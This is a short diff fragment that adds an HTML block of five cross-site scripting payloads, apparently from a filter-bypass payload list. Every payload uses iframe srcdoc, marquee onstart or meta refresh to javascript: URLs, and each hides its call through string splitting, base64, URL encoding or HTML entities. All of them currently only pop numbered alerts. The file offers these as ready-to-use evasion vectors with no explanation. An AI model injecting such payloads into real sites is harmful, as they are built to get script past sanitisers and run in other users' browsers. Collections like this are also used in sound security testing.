@@ -1,0 +1,7 @@
+```html
+<iframe srcdoc="<img src=x onerror=setTimeout(() => {window['al'+'ert'](2);}, 0)>"></iframe>
+<marquee onstart=eval(atob('YWxlcnQoMyk='))></marquee>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:window[&#39;al&#39;+&#39;ert&#39;](4)'>"></iframe>
+<marquee onstart=eval(decodeURIComponent('%61%6C%65%72%74%28%36%29'))></marquee>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:window[&#39;al&#39;+&#39;ert&#39;](8)'>"></iframe>
+```
